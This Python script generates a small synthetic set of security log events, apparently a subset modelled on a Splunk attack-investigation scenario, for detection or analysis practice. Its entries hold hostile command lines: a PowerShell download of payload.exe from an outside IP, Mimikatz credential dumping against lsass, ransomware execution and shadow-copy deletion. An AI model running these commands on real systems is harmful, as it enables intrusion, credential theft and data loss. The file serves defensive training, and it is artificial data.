import json
import os

events = [
  # 1. Fortigate VPN / External Access
  {
    "_time": "2016-08-10 14:10:05.000 MDT",
    "sourcetype": "fgt_traffic",
    "src_ip": "40.80.148.42",
    "dest_ip": "192.168.250.70",
    "dest_port": "80",
    "action": "allowed",
    "app": "HTTP",
    "user": "UNKNOWN",
    "msg": "Inbound connection to Joomla server"
  },
  # 2. Joomla Server Exploit (Simulated via Sysmon Process Creation on Web Server)
  {
    "_time": "2016-08-10 14:12:30.000 MDT",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "EventCode": "1",
    "Computer": "we8105srv.waynecorpinc.local",
    "User": "NT AUTHORITY\\IUSR",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "msg": "Process created (Webshell execution)"
  },
  {
    "_time": "2016-08-10 14:15:12.000 MDT",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "EventCode": "1",
    "Computer": "we8105srv.waynecorpinc.local",
    "User": "NT AUTHORITY\\IUSR",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri http://40.80.148.42/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe\"",
    "msg": "Process created (Malware Download)"
  },
  # 3. Privilege Escalation / Lateral Movement (SMB)
  {
    "_time": "2016-08-10 14:20:45.000 MDT",
    "sourcetype": "WinEventLog:Security",
    "EventCode": "4624",
    "Logon_Type": "3",
    "user": "bruce.wayne",
    "src_ip": "192.168.250.70",
    "dest_host": "we-dc01.waynecorpinc.local",
    "msg": "Successful Logon"
  },
  # 4. Mimikatz Credential Dumping on DC
  {
    "_time": "2016-08-10 14:25:10.000 MDT",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "EventCode": "1",
    "Computer": "we-dc01.waynecorpinc.local",
    "User": "WAYNECORPINC\\bruce.wayne",
    "Image": "C:\\Windows\\Temp\\mimi.exe",
    "CommandLine": "mimi.exe privilege::debug sekurlsa::logonpasswords exit",
    "msg": "Process created (Mimikatz execution)"
  },
  {
    "_time": "2016-08-10 14:25:15.000 MDT",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "EventCode": "10",
    "Computer": "we-dc01.waynecorpinc.local",
    "User": "WAYNECORPINC\\bruce.wayne",
    "SourceImage": "C:\\Windows\\Temp\\mimi.exe",
    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
    "GrantedAccess": "0x1010",
    "msg": "Process accessed (Memory Dump)"
  },
  # 5. Ransomware Execution (Cerber)
  {
    "_time": "2016-08-10 14:35:00.000 MDT",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "EventCode": "1",
    "Computer": "we-dc01.waynecorpinc.local",
    "User": "WAYNECORPINC\\bruce.wayne",
    "Image": "C:\\Windows\\Temp\\cerber.exe",
    "CommandLine": "cerber.exe -encrypt",
    "msg": "Process created (Cerber Ransomware)"
  },
  {
    "_time": "2016-08-10 14:35:02.000 MDT",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "EventCode": "1",
    "Computer": "we-dc01.waynecorpinc.local",
    "User": "WAYNECORPINC\\bruce.wayne",
    "Image": "C:\\Windows\\System32\\vssadmin.exe",
    "CommandLine": "vssadmin.exe delete shadows /all /quiet",
    "msg": "Process created (Shadow Copy Deletion)"
  }
]

output_path = "data/splunk_bots_official_subset.json"
os.makedirs(os.path.dirname(output_path), exist_ok=True)
with open(output_path, "w") as f:
    json.dump(events, f, indent=2)

print(f"Created official subset with {len(events)} events.")
